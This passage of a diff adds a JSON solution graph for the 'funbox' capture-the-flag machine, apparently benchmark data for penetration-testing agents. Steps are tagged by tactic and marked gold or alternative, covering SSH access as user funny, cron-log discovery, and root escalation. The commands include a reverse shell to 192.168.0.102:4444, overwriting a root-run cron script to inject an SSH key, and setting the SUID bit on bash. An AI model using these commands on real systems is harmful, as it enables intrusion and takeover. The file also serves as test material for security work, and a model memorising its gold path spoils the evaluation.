+                    "command": "echo 'chmod 600 /home/funny/.ssh/authorized_keys' >> /home/funny/.backup.sh",
+                    "output": "",
+                    "results": ["Set correct permissions on authorized_keys file", "Cron job will execute modified script within one minute"],
+                    "optional": false,
+                    "gold": false
+                }
+            ]
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Lateral Movement",
+                "prerequisites": ["Attacker's SSH key added to funny's authorized_keys", "Cron job has executed modified backup script"],
+                "contraindications": [],
+                "goal": "Establish SSH session as user funny using injected SSH key",
+                "command": "ssh 192.168.0.151 -l funny",
+                "output": "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Wed 19 Aug 2020 12:10:21 AM UTC\n\n System load:   0.0                 Processes:                  130\n Usage of /:    58.0% of 9.78GB     Users logged in:            0\n Memory usage:  58%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    2%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Fri Jun 19 14:15:05 2020 from 192.168.178.143\nfunny@funbox:~$",
+                "results": ["SSH access granted as user funny", "Full shell access as funny without restricted bash"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Lateral Movement",
+                "prerequisites": ["Attacker's SSH key added to funny's authorized_keys", "Cron job has executed modified backup script", "SSH private key available at /tmp/funnykey"],
+                "contraindications": [],
+                "goal": "Establish SSH session as user funny using injected SSH key",
+                "command": "ssh -i /tmp/funnykey funny@192.168.0.151",
+                "output": "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Wed 19 Aug 2020 12:10:21 AM UTC\n\n System load:   0.0                 Processes:                  130\n Usage of /:    58.0% of 9.78GB     Users logged in:            0\n Memory usage:  58%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    2%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Fri Jun 19 14:15:05 2020 from 192.168.178.143\nfunny@funbox:~$",
+                "results": ["SSH access granted as user funny", "Full shell access as funny without restricted bash"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh", "Backup script executed by funny's cron job"],
+                "contraindications": ["Reverse shell may be blocked by firewall", "Requires listener on attacker machine"],
+                "goal": "Establish SSH session as user funny using injected SSH key",
+                "command": "echo '#!/bin/bash\nbash -i >& /dev/tcp/192.168.0.102/4444 0>&1' > /home/funny/.backup.sh",
+                "output": "",
+                "results": [],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access as user funny", "Read access to /var/log/syslog"],
+                "contraindications": [],
+                "goal": "Identify that root user also executes the same backup script for privilege escalation",
+                "command": "cat /var/log/syslog | grep root",
+                "output": "Aug 19 00:05:01 funbox CRON[3311]: (root) CMD (/home/funny/.backup.sh)\nAug 19 00:05:01 funbox postfix/pickup[1790]: 4745A420A2: uid=0 from=<root>\nAug 19 00:05:01 funbox postfix/qmgr[1791]: 4745A420A2: from=<root@funbox.frit\nAug 19 00:05:01 funbox postfix/local[3307]: 4745A420A2: to=<root@funbox.fritz\nAug 19 00:09:01 funbox CRON[3379]: (root) CMD [ -x /usr/lib/php/sessioncle\nAug 19 00:10:01 funbox CRON[3470]: (root) CMD (/home/funny/.backup.sh)\nAug 19 00:10:01 funbox postfix/pickup[1790]: 58D8E45F82: uid=0 from=<root>\nAug 19 00:10:01 funbox postfix/qmgr[1791]: 58D8E45F82: from=<root@funbox.frit\nAug 19 00:10:01 funbox postfix/local[3482]: 58D8E45F82: to=<root@funbox.fritz\nfunny@funbox:/var/log$",
+                "results": ["Root user executes /home/funny/.backup.sh via cron", "Root's cron runs every 5 minutes", "Same writable script can be exploited for root access"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Discovery",
+                "prerequisites": ["Shell access as user funny", "Read access to /var/log/syslog"],
+                "contraindications": [],
+                "goal": "Identify that root user also executes the same backup script for privilege escalation",
+                "command": "grep -i 'backup.sh' /var/log/syslog",
+                "output": "Aug 19 00:05:01 funbox CRON[3311]: (root) CMD (/home/funny/.backup.sh)\nAug 19 00:10:01 funbox CRON[3470]: (root) CMD (/home/funny/.backup.sh)\nAug 19 00:15:01 funbox CRON[3542]: (root) CMD (/home/funny/.backup.sh)\nAug 19 00:20:01 funbox CRON[3614]: (root) CMD (/home/funny/.backup.sh)",
+                "results": ["Root user executes /home/funny/.backup.sh via cron", "Root's cron runs every 5 minutes", "Same writable script can be exploited for root access"],
+                "optional": false,
+                "gold": false
+            },
+            [
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Shell access as user funny", "Read access to /etc/crontab or /var/spool/cron/"],
+                    "contraindications": [],
+                    "goal": "Identify that root user also executes the same backup script for privilege escalation",
+                    "command": "cat /etc/crontab",
+                    "output": "# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*/5 * * * * root /home/funny/.backup.sh\n#",
+                    "results": ["Root user executes /home/funny/.backup.sh via cron", "Root's cron runs every 5 minutes"],
+                    "optional": false,
+                    "gold": false
+                },
+                {
+                    "tactic": "Discovery",
+                    "prerequisites": ["Cron job identified in /etc/crontab"],
+                    "contraindications": [],
+                    "goal": "Identify that root user also executes the same backup script for privilege escalation",
+                    "command": "ls -la /home/funny/.backup.sh",
+                    "output": "-rwxrwxrwx 1 funny funny 55 Jul 18 10:15 /home/funny/.backup.sh",
+                    "results": ["Same writable script can be exploited for root access"],
+                    "optional": false,
+                    "gold": false
+                }
+            ]
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh as user funny", "Root executes .backup.sh every 5 minutes", "SSH key pair available on attacker machine"],
+                "contraindications": [],
+                "goal": "Gain SSH access as root by injecting SSH key into root's authorized_keys via cron-executed script",
+                "command": "echo '#!/bin/bash\ncd /root; mkdir .ssh; cd .ssh;\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwvh+epb+9ghDyau0Tc/4jYFJ... rm@kali\" > authorized_keys\ntar -cf /home/funny/html.tar /var/www/html' > /home/funny/.backup.sh",
+                "output": "",
+                "results": ["Modified .backup.sh to create .ssh directory in root's home", "Modified .backup.sh to add attacker's SSH public key to root's authorized_keys", "Root's cron job will execute modified script within 5 minutes"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh as user funny", "Root executes .backup.sh every 5 minutes"],
+                "contraindications": [],
+                "goal": "Gain SSH access as root by injecting SSH key into root's authorized_keys via cron-executed script",
+                "command": "cat > /home/funny/.backup.sh << 'EOF'\n#!/bin/bash\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwvh+epb+9ghDyau0Tc/4jYFJ... rm@kali\" > /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\ntar -cf /home/funny/html.tar /var/www/html\nEOF",
+                "output": "",
+                "results": ["Modified .backup.sh to create .ssh directory in root's home", "Modified .backup.sh to add attacker's SSH public key to root's authorized_keys", "Root's cron job will execute modified script within 5 minutes"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Write access to /home/funny/.backup.sh as user funny", "Root executes .backup.sh every 5 minutes"],
+                "contraindications": [],
+                "goal": "Gain SSH access as root by injecting SSH key into root's authorized_keys via cron-executed script",
+                "command": "echo '#!/bin/bash\nchmod u+s /bin/bash' > /home/funny/.backup.sh",
+                "output": "",
+                "results": ["Modified .backup.sh to set SUID bit on /bin/bash", "Root's cron job will execute modified script within 5 minutes", "After execution, /bin/bash can be used to escalate to root with: /bin/bash -p"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Attacker's SSH key added to root's authorized_keys", "Root's cron job has executed modified backup script"],
+                "contraindications": [],
+                "goal": "Establish SSH session as root user to gain full system control",
+                "command": "ssh 192.168.0.151 -l root",
+                "output": "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Wed 19 Aug 2020 12:20:33 AM UTC\n\n System load:   0.0                 Processes:                  134\n Usage of /:    58.0% of 9.78GB     Users logged in:            0\n Memory usage:  59%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    2%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Wed Aug 19 00:20:26 2020 from 192.168.0.102\nroot@funbox:~#",
+                "results": ["SSH access granted as root user", "Full administrative privileges obtained"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["Attacker's SSH key added to root's authorized_keys", "Root's cron job has executed modified backup script"],
+                "contraindications": [],
+                "goal": "Establish SSH session as root user to gain full system control",
+                "command": "ssh root@funbox.fritz.box",
+                "output": "Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)\n\n* Documentation:    https://help.ubuntu.com\n* Management:       https://landscape.canonical.com\n* Support:          https://ubuntu.com/advantage\n\n System information as of Wed 19 Aug 2020 12:20:33 AM UTC\n\n System load:   0.0                 Processes:                  134\n Usage of /:    58.0% of 9.78GB     Users logged in:            0\n Memory usage:  59%                 IPv4 address for enp0s3:    192.168.0.151\n Swap usage:    2%\n\n*   \"If you've been waiting for the perfect Kubernetes dev solution for\n    macos, the wait is over. Learn how to install Microkas on macos.\"\n\n    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/\n33 updates can be installed immediately.\n0 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nYou have mail.\nLast login: Wed Aug 19 00:20:26 2020 from 192.168.0.102\nroot@funbox:~#",
+                "results": ["SSH access granted as root user", "Full administrative privileges obtained"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Privilege Escalation",
+                "prerequisites": ["SUID bit set on /bin/bash via modified backup script", "Shell access as user funny"],
+                "contraindications": [],
+                "goal": "Establish SSH session as root user to gain full system control",
+                "command": "/bin/bash -p",
+                "output": "bash-5.0# whoami\nroot",
+                "results": ["Root shell obtained via SUID bash", "Full administrative privileges obtained"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    },
+    {
+        "or": [
+            {
+                "tactic": "Collection",
+                "prerequisites": ["Root access to target system", "Flag file exists at /root/flag.txt"],
+                "contraindications": [],
+                "goal": "Retrieve the CTF flag to complete the challenge",
+                "command": "cat /root/flag.txt",
+                "output": "Great ! You did it...\nFUNBOX - made by @0815R2d2",
+                "results": ["Flag retrieved: <FLAG>"],
+                "optional": false,
+                "gold": true
+            },
+            {
+                "tactic": "Collection",
+                "prerequisites": ["Root access to target system", "Flag file exists at /root/flag.txt"],
+                "contraindications": [],
+                "goal": "Retrieve the CTF flag to complete the challenge",
+                "command": "head /root/flag.txt",
+                "output": "Great ! You did it...\nFUNBOX - made by @0815R2d2",
+                "results": ["Flag retrieved: <FLAG>"],
+                "optional": false,
+                "gold": false
+            },
+            {
+                "tactic": "Collection",
+                "prerequisites": ["Root access to target system"],
+                "contraindications": ["Flag file location may vary", "Searching entire filesystem is time-consuming"],
+                "goal": "Retrieve the CTF flag to complete the challenge",
+                "command": "find / -type f -name 'flag*' 2>/dev/null",
+                "output": "/root/flag.txt\n/usr/share/man/man1/flagstat.1.gz\n/usr/share/bash-completion/completions/flagstat",
+                "results": ["Flag file located at /root/flag.txt", "Additional non-relevant files with 'flag' in name found"],
+                "optional": false,
+                "gold": false
+            }
+        ]
+    }
+]
+
